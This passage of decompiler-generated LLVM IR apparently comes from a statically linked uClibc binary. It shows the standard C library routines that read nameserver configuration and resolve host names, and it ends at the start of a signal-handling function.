  uselistorder i32 %v4_10008aec, { 1, 0 }
  uselistorder i32 %v1_100089ec, { 1, 0 }
  uselistorder i32 %v1_100089c0, { 1, 0 }
  uselistorder i32 %v1_1000898c, { 1, 0 }
  uselistorder i32 %v1_10008924, { 1, 0 }
  uselistorder i32 %v2_10008890, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r28.global-to-local, { 0, 2, 3, 5, 4, 1, 6, 7, 8, 9 }
  uselistorder i32* %r18.global-to-local, { 0, 3, 5, 1, 4, 2, 6 }
  uselistorder i32* %r17.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r16.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 16, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 2, 17, 0, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 2, 1 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 4, 0, 3, 2 }
  uselistorder i32 17, { 1, 2, 13, 3, 16, 4, 5, 0, 6, 7, 8, 9, 10, 17, 18, 14, 15, 12, 11 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 1, 0, 4, 3 }
  uselistorder i32 (i32)* @__libc_close, { 5, 4, 3, 2, 10, 9, 1, 0, 8, 7, 6 }
  uselistorder i16* @global_var_1001d794.436, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 512, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_10008e90, { 1, 0 }
  uselistorder label %dec_label_pc_10008e60, { 1, 0 }
  uselistorder label %dec_label_pc_10008e30, { 1, 0 }
  uselistorder label %dec_label_pc_10008e20, { 1, 0 }
  uselistorder label %dec_label_pc_10008e10, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_100088ec.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10008df4, { 1, 0 }
  uselistorder label %dec_label_pc_10008ddc, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10008df8thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008d84, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10008d5c, { 1, 0 }
  uselistorder label %dec_label_pc_10008d38, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_10008d30, { 1, 0 }
  uselistorder label %dec_label_pc_10008d1c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10008c88, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008bc4, { 1, 0 }
  uselistorder label %dec_label_pc_10008bbc, { 1, 0 }
  uselistorder label %dec_label_pc_10008a60, { 1, 0 }
  uselistorder label %dec_label_pc_100089d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100088fc, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_10008ec8 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10008ec8, i32* @r3, align 4
  %v0_10008ed0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1001d798.384 to i32), i32* %r3.global-to-local, align 4
  %v0_10008ed8 = call i32 @__pthread_return_0()
  store i32 %v0_10008ed8, i32* %r3.global-to-local, align 4
  %v3_10008ee0 = load i32, i32* @global_var_1001d888.385, align 4
  %v2_10008ee4 = icmp sgt i32 %v3_10008ee0, 0
  br i1 %v2_10008ee4, label %dec_label_pc_1000915c, label %dec_label_pc_10008eec

dec_label_pc_10008eec:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1000cfa8.449 to i32), i32* %r3.global-to-local, align 4
  store i32 268472068, i32* @lr, align 4
  %v3_10008f00 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1000cfa8.449 to i32), i32 ptrtoint (i32* @global_var_1000cfbc.448 to i32))
  store i32 %v3_10008f00, i32* %r3.global-to-local, align 4
  store i32 %v3_10008f00, i32* @r26, align 4
  %v3_10008f04 = icmp eq i32 %v3_10008f00, 0
  br i1 %v3_10008f04, label %dec_label_pc_10008f0c, label %dec_label_pc_10009120.preheader

dec_label_pc_10008f0c:                            ; preds = %dec_label_pc_10008eec
  %v0_10008f10 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1000cfc0.450 to i32), i32* %r3.global-to-local, align 4
  store i32 268472092, i32* @lr, align 4
  %v3_10008f18 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1000cfc0.450 to i32), i32 %v0_10008f10)
  store i32 %v3_10008f18, i32* %r3.global-to-local, align 4
  store i32 %v3_10008f18, i32* @r26, align 4
  %v3_10008f1c = icmp eq i32 %v3_10008f18, 0
  br i1 %v3_10008f1c, label %dec_label_pc_10009150, label %dec_label_pc_10009120.preheader

dec_label_pc_10009120.preheader:                  ; preds = %dec_label_pc_10008eec, %dec_label_pc_10008f0c
  %v0_1000912c16 = phi i32 [ %v3_10008f00, %dec_label_pc_10008eec ], [ %v3_10008f18, %dec_label_pc_10008f0c ]
  %v2_10009120 = ptrtoint i32* %stack_var_-164 to i32
  %v1_10008f2c2 = bitcast i32* %stack_var_-164 to i8*
  %v3_10009010 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_10009120

dec_label_pc_10008f28:                            ; preds = %dec_label_pc_10008f40
  %v1_10008f28 = add i32 %v0_10008fe89, 1
  store i32 %v1_10008f28, i32* %r3.global-to-local, align 4
  %v1_10008f2c = inttoptr i32 %v1_10008f28 to i8*
  %v2_10008f2c = load i8, i8* %v1_10008f2c, align 1
  %v3_10008f2c = zext i8 %v2_10008f2c to i32
  store i32 %v3_10008f2c, i32* %r11.global-to-local, align 4
  %v3_10008f34 = icmp eq i8 %v2_10008f2c, 0
  br i1 %v3_10008f34, label %dec_label_pc_10009120.backedge, label %dec_label_pc_10008f40

dec_label_pc_10008f40:                            ; preds = %dec_label_pc_10008f40.lr.ph, %dec_label_pc_10008f28
  %v0_10008f44.in = phi i32 [ %v3_10008f2c4, %dec_label_pc_10008f40.lr.ph ], [ %v3_10008f2c, %dec_label_pc_10008f28 ]
  %v0_10008f58 = phi i32 [ %v3_10008f2c4, %dec_label_pc_10008f40.lr.ph ], [ %v3_10008f2c, %dec_label_pc_10008f28 ]
  %v0_10008fe89 = phi i32 [ %v2_10009120, %dec_label_pc_10008f40.lr.ph ], [ %v1_10008f28, %dec_label_pc_10008f28 ]
  %v0_10008f44 = mul nuw nsw i32 %v0_10008f44.in, 2
  %v2_10008f44 = add i32 %v0_10008f44, %v3_10008f40.pre
  %v3_10008f44 = inttoptr i32 %v2_10008f44 to i16*
  %v4_10008f44 = load i16, i16* %v3_10008f44, align 2
  %v1_10008f48 = and i16 %v4_10008f44, 32
  %v3_10008f48 = icmp eq i16 %v1_10008f48, 0
  br i1 %v3_10008f48, label %dec_label_pc_10008f50, label %dec_label_pc_10008f28

dec_label_pc_10008f50:                            ; preds = %dec_label_pc_10008f40
  %v3_10008f50 = icmp eq i32 %v0_10008f58, 10
  br i1 %v3_10008f50, label %dec_label_pc_10009120.backedge, label %dec_label_pc_10008f58

dec_label_pc_10008f58:                            ; preds = %dec_label_pc_10008f50
  %v3_10008f58 = icmp eq i32 %v0_10008f58, 35
  br i1 %v3_10008f58, label %dec_label_pc_10009120.backedge, label %dec_label_pc_10008f60

dec_label_pc_10009120.backedge:                   ; preds = %dec_label_pc_10008f28, %dec_label_pc_100090d4, %dec_label_pc_100090dc, %dec_label_pc_10009114, %dec_label_pc_10008f2c.preheader, %dec_label_pc_10008f58, %dec_label_pc_10008f50, %dec_label_pc_1000907c
  %v0_1000912c.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_10009120

dec_label_pc_10008f60:                            ; preds = %dec_label_pc_10008f58
  store i32 0, i32* @r27, align 4
  store i32 %v2_10008ec8, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_10008fe810 = inttoptr i32 %v0_10008fe89 to i8*
  %v2_10008fe811 = load i8, i8* %v1_10008fe810, align 1
  %v3_10008fec14 = icmp eq i8 %v2_10008fe811, 0
  br i1 %v3_10008fec14, label %dec_label_pc_10008ffc, label %dec_label_pc_10008ff4

dec_label_pc_10008f74:                            ; preds = %dec_label_pc_10008ff4
  %v1_10008f74 = mul i32 %v0_10008f74, 4
  %v3_10008f78 = load i32, i32* @global_var_1001d808, align 4
  store i32 %v3_10008f78, i32* %r11.global-to-local, align 4
  %v1_10008f7c = load i32, i32* %r6.global-to-local, align 4
  %v2_10008f7c = add i32 %v1_10008f7c, %v1_10008f74
  %v2_10008f80 = add i32 %v2_10008f7c, 16
  %v3_10008f80 = inttoptr i32 %v2_10008f80 to i32*
  store i32 %v0_10008f80, i32* %v3_10008f80, align 4
  %v0_10008f8c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008f8c

dec_label_pc_10008f88:                            ; preds = %dec_label_pc_10008fa0
  %v1_10008f88 = add i32 %v0_10008f88, 1
  store i32 %v1_10008f88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008f8c

dec_label_pc_10008f8c:                            ; preds = %dec_label_pc_10008f74, %dec_label_pc_10008f88
  %v0_10008f88 = phi i32 [ %v0_10008f8c.pre, %dec_label_pc_10008f74 ], [ %v1_10008f88, %dec_label_pc_10008f88 ]
  %v1_10008f8c = inttoptr i32 %v0_10008f88 to i8*
  %v2_10008f8c = load i8, i8* %v1_10008f8c, align 1
  %v3_10008f90 = icmp eq i8 %v2_10008f8c, 0
  br i1 %v3_10008f90, label %dec_label_pc_10008fbc, label %dec_label_pc_10008fa0

dec_label_pc_10008fa0:                            ; preds = %dec_label_pc_10008f8c
  %v3_10008f98 = icmp eq i8 %v2_10008f8c, 10
  %v3_10008f8c = zext i8 %v2_10008f8c to i32
  %v1_10008f94 = mul nuw nsw i32 %v3_10008f8c, 2
  %v1_10008fa0 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008fa0 = add i32 %v1_10008fa0, %v1_10008f94
  %v3_10008fa0 = inttoptr i32 %v2_10008fa0 to i16*
  %v4_10008fa0 = load i16, i16* %v3_10008fa0, align 2
  %v1_10008fa4 = and i16 %v4_10008fa0, 32
  %v3_10008fa4.not = icmp ne i16 %v1_10008fa4, 0
  %brmerge = or i1 %v3_10008f98, %v3_10008fa4.not
  br i1 %brmerge, label %dec_label_pc_10008fbc, label %dec_label_pc_10008f88

dec_label_pc_10008fb4:                            ; preds = %dec_label_pc_10008fd0
  %v0_10008fb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_10008fb4 = trunc i32 %v0_10008fb4 to i8
  store i8 %v1_10008fb4, i8* %v1_10008fbc, align 1
  %v0_10008fb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10008fb8 = add i32 %v0_10008fb8, 1
  store i32 %v1_10008fb8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008fbc

dec_label_pc_10008fbc:                            ; preds = %dec_label_pc_10008fa0, %dec_label_pc_10008f8c, %dec_label_pc_10008fb4
  %v0_10008fe8 = phi i32 [ %v1_10008fb8, %dec_label_pc_10008fb4 ], [ %v0_10008f88, %dec_label_pc_10008f8c ], [ %v0_10008f88, %dec_label_pc_10008fa0 ]
  %v1_10008fbc = inttoptr i32 %v0_10008fe8 to i8*
  %v2_10008fbc = load i8, i8* %v1_10008fbc, align 1
  %v3_10008fbc = zext i8 %v2_10008fbc to i32
  %v3_10008fc0 = icmp eq i8 %v2_10008fbc, 0
  %v1_10008fc4 = mul nuw nsw i32 %v3_10008fbc, 2
  store i32 %v1_10008fc4, i32* %r11.global-to-local, align 4
  br i1 %v3_10008fc0, label %dec_label_pc_10008fe4, label %dec_label_pc_10008fd0

dec_label_pc_10008fd0:                            ; preds = %dec_label_pc_10008fbc
  %v3_10008fc8 = icmp eq i8 %v2_10008fbc, 10
  %v3_10008fd0 = load i32, i32* @global_var_1001d808, align 4
  %v2_10008fd4 = add i32 %v3_10008fd0, %v1_10008fc4
  %v3_10008fd4 = inttoptr i32 %v2_10008fd4 to i16*
  %v4_10008fd4 = load i16, i16* %v3_10008fd4, align 2
  %v1_10008fd8 = and i16 %v4_10008fd4, 32
  %v3_10008fd8.not = icmp ne i16 %v1_10008fd8, 0
  %brmerge27 = or i1 %v3_10008fc8, %v3_10008fd8.not
  br i1 %brmerge27, label %dec_label_pc_10008fb4, label %dec_label_pc_10008fe4

dec_label_pc_10008fe4:                            ; preds = %dec_label_pc_10008fd0, %dec_label_pc_10008fbc
  %v0_10008fe4 = load i32, i32* @r27, align 4
  %v1_10008fe4 = add i32 %v0_10008fe4, 1
  store i32 %v1_10008fe4, i32* @r27, align 4
  %v2_10008fe8 = load i8, i8* %v1_10008fbc, align 1
  %v3_10008fec = icmp eq i8 %v2_10008fe8, 0
  br i1 %v3_10008fec, label %dec_label_pc_10008ffc, label %dec_label_pc_10008ff4

dec_label_pc_10008ff4:                            ; preds = %dec_label_pc_10008f60, %dec_label_pc_10008fe4
  %v0_10008f80 = phi i32 [ %v0_10008fe8, %dec_label_pc_10008fe4 ], [ %v0_10008fe89, %dec_label_pc_10008f60 ]
  %v0_10008f74 = phi i32 [ %v1_10008fe4, %dec_label_pc_10008fe4 ], [ 0, %dec_label_pc_10008f60 ]
  %tmp33 = icmp slt i32 %v0_10008f74, 5
  br i1 %tmp33, label %dec_label_pc_10008f74, label %dec_label_pc_10008ffc

dec_label_pc_10008ffc:                            ; preds = %dec_label_pc_10008fe4, %dec_label_pc_10008ff4, %dec_label_pc_10008f60
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1000cfd8.451 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_10009010 = call i32 @__GI_strcoll(i8* %v3_10009010, i32 ptrtoint ([11 x i8]* @global_var_1000cfd8.451 to i32))
  store i32 %v4_10009010, i32* %r3.global-to-local, align 4
  %v3_10009014 = icmp eq i32 %v4_10009010, 0
  br i1 %v3_10009014, label %dec_label_pc_10009040, label %dec_label_pc_10009064

dec_label_pc_10009020:                            ; preds = %dec_label_pc_10009058
  %v1_10009020 = add i32 %v2_10009048, 24
  %v2_10009020 = inttoptr i32 %v1_10009020 to i32*
  %v3_10009020 = load i32, i32* %v2_10009020, align 4
  store i32 %v3_10009020, i32* %r3.global-to-local, align 4
  store i32 268472360, i32* @lr, align 4
  %v1_10009024 = call i32 @__GI_strdup(i32 %v3_10009020)
  store i32 %v1_10009024, i32* %r3.global-to-local, align 4
  %v0_1000902c = load i32, i32* @r29, align 4
  %v1_1000902c = add i32 %v0_1000902c, 1
  store i32 %v1_1000902c, i32* %r11.global-to-local, align 4
  %v1_10009030 = mul i32 %v0_1000902c, 4
  store i32 %v1_1000902c, i32* @global_var_1001d888.385, align 4
  %v3_1000903c = add i32 %v1_10009030, ptrtoint (i32* @global_var_1001fef4.386 to i32)
  %v4_1000903c = inttoptr i32 %v3_1000903c to i32*
  store i32 %v1_10009024, i32* %v4_1000903c, align 4
  br label %dec_label_pc_10009040

dec_label_pc_10009040:                            ; preds = %dec_label_pc_10008ffc, %dec_label_pc_10009020
  %v0_10009040 = load i32, i32* @r31, align 4
  %v1_10009040 = load i32, i32* @r27, align 4
  %v2_10009040 = icmp slt i32 %v0_10009040, %v1_10009040
  %v1_10009044 = mul i32 %v0_10009040, 4
  %v0_10009048 = load i32, i32* @r1, align 4
  %v2_10009048 = add i32 %v0_10009048, %v1_10009044
  br i1 %v2_10009040, label %dec_label_pc_10009058, label %dec_label_pc_10009064

dec_label_pc_10009058:                            ; preds = %dec_label_pc_10009040
  %v3_10009058 = load i32, i32* @global_var_1001d888.385, align 4
  %tmp35 = icmp slt i32 %v3_10009058, 3
  br i1 %tmp35, label %dec_label_pc_10009020, label %dec_label_pc_10009064

dec_label_pc_10009064:                            ; preds = %dec_label_pc_10009058, %dec_label_pc_10009040, %dec_label_pc_10008ffc
  %v0_10009068 = load i32, i32* @r30, align 4
  store i32 %v0_10009068, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000cfe4.452 to i32), i32* @r4, align 4
  %v3_10009070 = inttoptr i32 %v0_10009068 to i8*
  %v4_10009070 = call i32 @__GI_strcoll(i8* %v3_10009070, i32 ptrtoint ([7 x i8]* @global_var_1000cfe4.452 to i32))
  store i32 %v4_10009070, i32* %r3.global-to-local, align 4
  %v3_10009074 = icmp eq i32 %v4_10009070, 0
  br i1 %v3_10009074, label %dec_label_pc_100090b4.preheader, label %dec_label_pc_1000907c

dec_label_pc_1000907c:                            ; preds = %dec_label_pc_10009064
  %v0_10009080 = load i32, i32* @r30, align 4
  store i32 %v0_10009080, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000cfec.453 to i32), i32* @r4, align 4
  %v3_10009088 = inttoptr i32 %v0_10009080 to i8*
  %v4_10009088 = call i32 @__GI_strcoll(i8* %v3_10009088, i32 ptrtoint ([7 x i8]* @global_var_1000cfec.453 to i32))
  store i32 %v4_10009088, i32* %r3.global-to-local, align 4
  %v3_1000908c = icmp eq i32 %v4_10009088, 0
  br i1 %v3_1000908c, label %dec_label_pc_100090b4.preheader, label %dec_label_pc_10009120.backedge

dec_label_pc_100090b4.preheader:                  ; preds = %dec_label_pc_10009064, %dec_label_pc_1000907c
  store i32 ptrtoint (i32* @global_var_1001fee4.440 to i32), i32* @r31, align 4
  %v3_100090c041 = load i32, i32* @global_var_1001d88c.438, align 4
  %v2_100090c443 = icmp sgt i32 %v3_100090c041, 0
  %v1_100090c845 = add i32 %v3_100090c041, -1
  %v1_100090cc46 = mul i32 %v1_100090c845, 4
  store i32 %v1_100090cc46, i32* %r11.global-to-local, align 4
  br i1 %v2_100090c443, label %dec_label_pc_10009098, label %dec_label_pc_100090d4

dec_label_pc_10009098:                            ; preds = %dec_label_pc_100090b4.preheader, %dec_label_pc_10009098
  %v1_100090cc48 = phi i32 [ %v1_100090cc, %dec_label_pc_10009098 ], [ %v1_100090cc46, %dec_label_pc_100090b4.preheader ]
  %v1_100090c847 = phi i32 [ %v1_100090c8, %dec_label_pc_10009098 ], [ %v1_100090c845, %dec_label_pc_100090b4.preheader ]
  %v2_10009098 = add i32 %v1_100090cc48, ptrtoint (i32* @global_var_1001fee4.440 to i32)
  %v3_10009098 = inttoptr i32 %v2_10009098 to i32*
  %v4_10009098 = load i32, i32* %v3_10009098, align 4
  store i32 %v4_10009098, i32* @r3, align 4
  store i32 %v1_100090c847, i32* @global_var_1001d88c.438, align 4
  store i32 268472484, i32* @lr, align 4
  %v0_100090a0 = call i32 @free()
  store i32 %v0_100090a0, i32* %r3.global-to-local, align 4
  %v3_100090a4 = load i32, i32* @global_var_1001d88c.438, align 4
  %v1_100090ac = mul i32 %v3_100090a4, 4
  %v1_100090b0 = load i32, i32* @r31, align 4
  %v3_100090b0 = add i32 %v1_100090b0, %v1_100090ac
  %v4_100090b0 = inttoptr i32 %v3_100090b0 to i32*
  store i32 0, i32* %v4_100090b0, align 4
  store i32 ptrtoint (i32* @global_var_1001fee4.440 to i32), i32* @r31, align 4
  %v3_100090c0 = load i32, i32* @global_var_1001d88c.438, align 4
  %v2_100090c4 = icmp sgt i32 %v3_100090c0, 0
  %v1_100090c8 = add i32 %v3_100090c0, -1
  %v1_100090cc = mul i32 %v1_100090c8, 4
  store i32 %v1_100090cc, i32* %r11.global-to-local, align 4
  br i1 %v2_100090c4, label %dec_label_pc_10009098, label %dec_label_pc_100090d4

dec_label_pc_100090d4:                            ; preds = %dec_label_pc_10009098, %dec_label_pc_100090b4.preheader
  %v3_1000911459 = phi i32 [ %v3_100090c041, %dec_label_pc_100090b4.preheader ], [ %v3_100090c0, %dec_label_pc_10009098 ]
  %v1_100090fc49 = load i32, i32* @r27, align 4
  %v2_100090fc50 = icmp sgt i32 %v1_100090fc49, 1
  %v0_1000910453 = load i32, i32* @r1, align 4
  %v2_1000910454 = add i32 %v0_1000910453, 4
  br i1 %v2_100090fc50, label %dec_label_pc_10009114, label %dec_label_pc_10009120.backedge

dec_label_pc_100090dc:                            ; preds = %dec_label_pc_10009114
  %v1_100090dc = add i32 %v2_1000910455, 24
  %v2_100090dc = inttoptr i32 %v1_100090dc to i32*
  %v3_100090dc = load i32, i32* %v2_100090dc, align 4
  store i32 %v3_100090dc, i32* %r3.global-to-local, align 4
  store i32 268472548, i32* @lr, align 4
  %v1_100090e0 = call i32 @__GI_strdup(i32 %v3_100090dc)
  store i32 %v1_100090e0, i32* %r3.global-to-local, align 4
  %v0_100090e8 = load i32, i32* @r29, align 4
  %v1_100090e8 = add i32 %v0_100090e8, 1
  store i32 %v1_100090e8, i32* %r11.global-to-local, align 4
  %v1_100090ec = mul i32 %v0_100090e8, 4
  store i32 %v1_100090e8, i32* @global_var_1001d88c.438, align 4
  %v3_100090f8 = add i32 %v1_100090ec, ptrtoint (i32* @global_var_1001fee4.440 to i32)
  %v4_100090f8 = inttoptr i32 %v3_100090f8 to i32*
  store i32 %v1_100090e0, i32* %v4_100090f8, align 4
  %v0_100090fc.pre = load i32, i32* @r31, align 4
  %v1_100090fc = load i32, i32* @r27, align 4
  %v2_100090fc = icmp slt i32 %v0_100090fc.pre, %v1_100090fc
  br i1 %v2_100090fc, label %dec_label_pc_100090dc.dec_label_pc_10009114_crit_edge, label %dec_label_pc_10009120.backedge

dec_label_pc_100090dc.dec_label_pc_10009114_crit_edge: ; preds = %dec_label_pc_100090dc
  %v0_10009104 = load i32, i32* @r1, align 4
  %v1_10009100 = mul i32 %v0_100090fc.pre, 4
  %v2_10009104 = add i32 %v0_10009104, %v1_10009100
  %v3_10009114.pre = load i32, i32* @global_var_1001d88c.438, align 4
  br label %dec_label_pc_10009114

dec_label_pc_10009114:                            ; preds = %dec_label_pc_100090d4, %dec_label_pc_100090dc.dec_label_pc_10009114_crit_edge
  %v3_10009114 = phi i32 [ %v3_10009114.pre, %dec_label_pc_100090dc.dec_label_pc_10009114_crit_edge ], [ %v3_1000911459, %dec_label_pc_100090d4 ]
  %v2_1000910455 = phi i32 [ %v2_10009104, %dec_label_pc_100090dc.dec_label_pc_10009114_crit_edge ], [ %v2_1000910454, %dec_label_pc_100090d4 ]
  %tmp37 = icmp slt i32 %v3_10009114, 4
  br i1 %tmp37, label %dec_label_pc_100090dc, label %dec_label_pc_10009120.backedge

dec_label_pc_10009120:                            ; preds = %dec_label_pc_10009120.backedge, %dec_label_pc_10009120.preheader
  %v0_1000912c = phi i32 [ %v0_1000912c.pre, %dec_label_pc_10009120.backedge ], [ %v0_1000912c16, %dec_label_pc_10009120.preheader ]
  store i32 %v2_10009120, i32* %r3.global-to-local, align 4
  store i32 268472628, i32* @lr, align 4
  %v3_10009130 = call i32 @fgets(i32 %v2_10009120, i32 128, i32 %v0_1000912c)
  store i32 %v3_10009130, i32* %r3.global-to-local, align 4
  %v3_10009134 = icmp eq i32 %v3_10009130, 0
  br i1 %v3_10009134, label %dec_label_pc_10009144, label %dec_label_pc_10008f2c.preheader

dec_label_pc_10008f2c.preheader:                  ; preds = %dec_label_pc_10009120
  store i32 %v2_10009120, i32* %r3.global-to-local, align 4
  %v2_10008f2c3 = load i8, i8* %v1_10008f2c2, align 4
  %v3_10008f2c4 = zext i8 %v2_10008f2c3 to i32
  store i32 %v3_10008f2c4, i32* %r11.global-to-local, align 4
  %v3_10008f346 = icmp eq i8 %v2_10008f2c3, 0
  br i1 %v3_10008f346, label %dec_label_pc_10009120.backedge, label %dec_label_pc_10008f40.lr.ph

dec_label_pc_10008f40.lr.ph:                      ; preds = %dec_label_pc_10008f2c.preheader
  %v3_10008f40.pre = load i32, i32* @global_var_1001d808, align 4
  br label %dec_label_pc_10008f40

dec_label_pc_10009144:                            ; preds = %dec_label_pc_10009120
  %v0_10009144 = load i32, i32* @r26, align 4
  store i32 %v0_10009144, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000914c.454 to i32), i32* @lr, align 4
  %v1_10009148 = inttoptr i32 %v0_10009144 to i16*
  %v2_10009148 = call i32 @__GI_fclose(i16* %v1_10009148)
  store i32 %v2_10009148, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000915c

dec_label_pc_10009150:                            ; preds = %dec_label_pc_10008f0c
  %v0_10009150 = call i32 @__GI___h_errno_location()
  store i32 %v0_10009150, i32* %r3.global-to-local, align 4
  %v2_10009158 = inttoptr i32 %v0_10009150 to i32*
  store i32 3, i32* %v2_10009158, align 4
  br label %dec_label_pc_1000915c

dec_label_pc_1000915c:                            ; preds = %entry, %dec_label_pc_10009144, %dec_label_pc_10009150
  store i32 %v2_10008ec8, i32* @r3, align 4
  %v0_10009164 = call i32 @__pthread_return_void()
  store i32 %v0_10009164, i32* %r3.global-to-local, align 4
  ret i32 %v0_10009164

; uselistorder directives
  uselistorder i32 %v3_10008f2c4, { 2, 0, 1 }
  uselistorder i32 %v1_100090cc46, { 1, 0 }
  uselistorder i32 %v1_100090c845, { 1, 0 }
  uselistorder i32 %v0_10008f74, { 1, 0 }
  uselistorder i32 %v1_10008fc4, { 1, 0 }
  uselistorder i8* %v1_10008fbc, { 0, 2, 1 }
  uselistorder i8 %v2_10008f8c, { 2, 0, 1 }
  uselistorder i32 %v0_10008f88, { 0, 1, 3, 2 }
  uselistorder i32 %v3_10008f2c, { 1, 0, 2 }
  uselistorder i32 %v1_10008f28, { 0, 2, 1 }
  uselistorder i32 %v2_10009120, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10008ec8, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 10, 11, 12, 13, 1, 2, 3, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 26, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r11.global-to-local, { 0, 3, 4, 1, 5, 6, 7, 8, 2 }
  uselistorder i32 ()* @__GI___h_errno_location, { 1, 5, 4, 3, 0, 2 }
  uselistorder i32 ()* @free, { 0, 13, 12, 11, 10, 9, 8, 7, 22, 21, 6, 5, 4, 3, 2, 15, 14, 1, 20, 19, 18, 17, 16 }
  uselistorder i32* @global_var_1001d88c.438, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_1001fee4.440 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1001fef4.386 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001d798.384 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000915c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009114, { 1, 0 }
  uselistorder label %dec_label_pc_10009098, { 1, 0 }
  uselistorder label %dec_label_pc_100090b4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10009040, { 1, 0 }
  uselistorder label %dec_label_pc_10008ffc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10008fbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008f8c, { 1, 0 }
  uselistorder label %dec_label_pc_10009120.backedge, { 4, 3, 2, 1, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_10009120.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_10009180 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268472768, i32* @lr, align 4
  %v9_100091bc = inttoptr i32 %arg3 to i32*
  %v10_100091bc = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_100091bc, i32 %arg4, i32 %arg5, i32 %v4_10009180, i32 %arg7)
  ret i32 %v10_100091bc
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
